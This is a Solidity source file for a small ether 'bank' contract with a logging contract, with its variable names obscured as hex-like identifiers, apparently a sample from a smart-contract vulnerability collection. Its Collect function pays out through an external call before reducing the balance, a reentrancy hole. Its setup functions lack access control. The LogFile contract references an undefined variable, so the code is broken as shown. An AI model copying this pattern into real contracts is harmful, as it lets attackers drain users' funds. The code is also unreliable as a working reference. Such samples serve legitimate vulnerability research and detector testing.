// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public _0x200f9c;

    uint public MinSum = 1 ether;

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool _0x68b256;

    function SetMinSum(uint _0xc19dfc)
    public
    {
        if(_0x68b256)revert();
        MinSum = _0xc19dfc;
    }

    function SetLogFile(address _0x778b66)
    public
    {
        if(_0x68b256)revert();
        Log = LogFile(_0x778b66);
    }

    function Initialized()
    public
    {
        _0x68b256 = true;
    }

    function Deposit()
    public
    payable
    {
        _0x200f9c[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,"Put");
    }

    function Collect(uint _0xe2a092)
    public
    payable
    {
        if(_0x200f9c[msg.sender]>=MinSum && _0x200f9c[msg.sender]>=_0xe2a092)
        {
            if(msg.sender.call.value(_0xe2a092)())
            {
                _0x200f9c[msg.sender]-=_0xe2a092;
                Log.AddMessage(msg.sender,_0xe2a092,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        Deposit();
    }

}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x0573d6,uint _0xc19dfc,string _0xae21bd)
    public
    {
        LastMsg.Sender = _0x0573d6;
        LastMsg.Time = _0xd1dd83;
        LastMsg.Val = _0xc19dfc;
        LastMsg.Data = _0xae21bd;
        History.push(LastMsg);
    }
}